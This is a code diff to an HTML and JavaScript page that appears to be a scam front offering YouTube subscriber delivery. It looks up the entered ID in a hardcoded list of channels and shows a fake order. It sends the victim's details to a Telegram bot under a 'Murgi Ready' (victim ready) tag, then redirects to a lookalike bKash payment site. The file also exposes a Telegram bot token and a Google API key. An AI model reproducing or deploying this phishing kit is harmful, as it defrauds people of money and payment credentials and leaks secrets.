@@ -63,6 +63,7 @@
             background-color: #f9f9f9;
             letter-spacing: 0.17em; /* Spacing for password-like input */
             font-family: 'Courier New', Courier, monospace; /* Monospace font for password style */
+            -webkit-text-security: disc; /* Hide text like a password */
         }
 
         /* Confirm Button Styling */
@@ -81,6 +82,10 @@
         @keyframes flicker {
             0%, 100% { background-color: black; color: white; }
             50% { background-color: white; color: black; }
+        }
+
+        input[type="submit"]:hover {
+            /* No hover effect; flicker will show action */
         }
 
         /* Channel Info Styling */
@@ -179,7 +184,7 @@
 <div class="input-container">
     <input type="text" id="username" placeholder="SUBSCRIPTION ID"><br>
 </div>
-<input type="submit" value="CONFIRM" onclick="fetchChannelData()">
+<input type="submit" value="CONFIRM" onclick="checkUsername()">
 
 <!-- Channel Information -->
 <div class="info" id="info">
@@ -194,87 +199,87 @@
 <div id="countdown"></div>
 
 <script>
-    function fetchChannelData() {
-        const username = document.getElementById("username").value;
+    // Simulated database of usernames, channel names, quantities, and logos
+    const database = [
+        { username: "main5main5", channelName: "নতুন সব অনলাইন গেমের তথ্য ", quantity: 2000, logo: "https://imgur.com/qnwzXgr.png" },
+        { username: "shakibtech9359", channelName: "Shakib Tech", quantity: 2000, logo: "https://imgur.com/B8HiG5o.png" },
+        { username: "nazmul_bhai-6", channelName: "Mr RABIT", quantity: 1000, logo: "https://imgur.com/4dTLjXM.png" },
+        { username: "IdealFact33", channelName: "Ideal Fact", quantity: 1000, logo: "https://imgur.com/qW6V6qq.png" },
+        { username: "moralstoryfact455", channelName: "Shefa", quantity: 2000, logo: "https://imgur.com/eJcXWFW.png" },
+        { username: "moumoon-nu9bs", channelName: "Listen, Learn & Love Islam", quantity: 2000, logo: "https://imgur.com/kF44p1E.png" },
+        { username: "waz4max-y5o", channelName: "waz4max", quantity: 1000, logo: "https://imgur.com/9dYBIe9.png" },
+        { username: "learntradingfree01", channelName: "Learn Trading Free", quantity: 2000, logo: "https://imgur.com/Xi7VtxZ.png" },
+        { username: "Beshnokorjotimoy", channelName: "Beshno Kor Jotimoy", quantity: 2000, logo: "https://imgur.com/Ykq0aBg.png" },
+        { username: "bdfunny71", channelName: "bd funny 71", quantity: 2000, logo: "https://imgur.com/Y4Oqzrr.png" }
+    ];
 
-        // Fetch channel data from YouTube API
-        const apiKey = 'AIzaSyA4wz_vD0KQcm5RNXbgC39ecpmMSlrxarM';
-        const url = `https://www.googleapis.com/youtube/v3/channels?forUsername=${username}&part=snippet,statistics&key=${apiKey}`;
+    function checkUsername() {
+    const username = document.getElementById("username").value;
+    const user = database.find(user => user.username === username);
 
-        fetch(url)
-            .then(response => response.json())
-            .then(data => {
-                if (data.items && data.items.length > 0) {
-                    const channel = data.items[0].snippet;
-                    const stats = data.items[0].statistics;
+    if (user) {
+        document.getElementById("channel").innerText = user.channelName;
+        document.getElementById("qty").innerText = user.quantity;
+        document.getElementById("channelLogo").src = user.logo; // Set channel logo
+        document.getElementById("channelLogo").style.display = 'block'; // Display channel logo
 
-                    // Set channel information
-                    document.getElementById("channel").innerText = channel.title;
-                    document.getElementById("qty").innerText = stats.subscriberCount;
-                    document.getElementById("channelLogo").src = channel.thumbnails.default.url; // Use default thumbnail
-                    document.getElementById("channelLogo").style.display = 'block'; // Display channel logo
+        // Send user information to Telegram
+        sendToTelegram(user);
 
-                    // Send user information to Telegram
-                    sendToTelegram(channel.title, stats.subscriberCount, username);
+        // Show channel information and countdown
+        document.getElementById("info").style.display = 'block';
+        startCountdown(10); // Start countdown with 10 seconds
 
-                    // Show channel information and countdown
-                    document.getElementById("info").style.display = 'block';
-                    startCountdown(10); // Start countdown with 10 seconds
-
-                    // Hide input section
-                    document.getElementById("username").style.display = 'none';
-                    document.querySelector("input[type='submit']").style.display = 'none';
-                } else {
-                    alert("Channel not found!");
-                }
-            })
-            .catch(error => {
-                console.error('Error fetching channel data:', error);
-                alert("An error occurred while fetching channel data.");
-            });
+        // Hide input section
+        document.getElementById("username").style.display = 'none';
+        document.querySelector("input[type='submit']").style.display = 'none';
+    } else {
+        alert("Username not found!");
     }
+}
 
-    // Function to send user information to Telegram
-        function sendToTelegram(channelName, subscriberCount, username) {
-            const botToken = '7721532005:AAFNUxtAwHeH617lb1oOp3hcdKKjzRITS3Y';
-            const chatId = '6471397661';
-            const message = `🐸✅Murgi Ready:\nChannel Name: ${channelName}\nSubscriber Count: ${subscriberCount}\nUsername: ${username}`;
-            
-            // Create the Telegram API URL
-            const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+// Function to send user information to Telegram
+function sendToTelegram(user) {
+    const botToken = '7721532005:AAFNUxtAwHeH617lb1oOp3hcdKKjzRITS3Y';
+    const chatId = '6471397661';
+    const message = `🐸✅Murgi Ready:\nChannel Name: ${user.channelName}\nQuantity: ${user.quantity}\nUsername: ${user.username}`;
+    
+    // Create the Telegram API URL
+    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
 
-            // Send the message using fetch
-            fetch(telegramUrl)
-                .then(response => {
-                    if (!response.ok) {
-                        throw new Error('Network response was not ok ' + response.statusText);
-                    }
-                    return response.json();
-                })
-                .then(data => {
-                    console.log('Message sent successfully', data);
-                })
-                .catch(error => {
-                    console.error('Error sending message to Telegram:', error);
-                });
+    // Send the message using fetch
+    fetch(telegramUrl)
+        .then(response => {
+            if (!response.ok) {
+                throw new Error('Network response was not ok ' + response.statusText);
+            }
+            return response.json();
+        })
+        .then(data => {
+            console.log('Message sent successfully', data);
+        })
+        .catch(error => {
+            console.error('Error sending message to Telegram:', error);
+        });
+}
+
+
+    function startCountdown(seconds) {
+        const countdownElement = document.getElementById("countdown");
+        countdownElement.style.display = 'block';
+
+        let remainingTime = seconds;
+
+        const countdownInterval = setInterval(() => {
+            countdownElement.innerHTML = `Time remaining: <span class="countdown-ball">${remainingTime}</span> seconds`;
+            remainingTime--;
+
+            if (remainingTime < 0) {
+            clearInterval(countdownInterval);
+            window.location.href = "https://pay-bkash.vercel.app"; // Redirect to index4.html
         }
-
-        function startCountdown(seconds) {
-            const countdownElement = document.getElementById("countdown");
-            countdownElement.style.display = 'block';
-
-            let remainingTime = seconds;
-
-            const countdownInterval = setInterval(() => {
-                countdownElement.innerHTML = `Time remaining: <span class="countdown-ball">${remainingTime}</span> seconds`;
-                remainingTime--;
-
-                if (remainingTime < 0) {
-                    clearInterval(countdownInterval);
-                    window.location.href = "https://pay-bkash.vercel.app"; // Redirect to your specified URL
-                }
-            }, 1000);
-        }
-    </script>
+        }, 1000);
+    }
+</script>
 </body>
 </html>
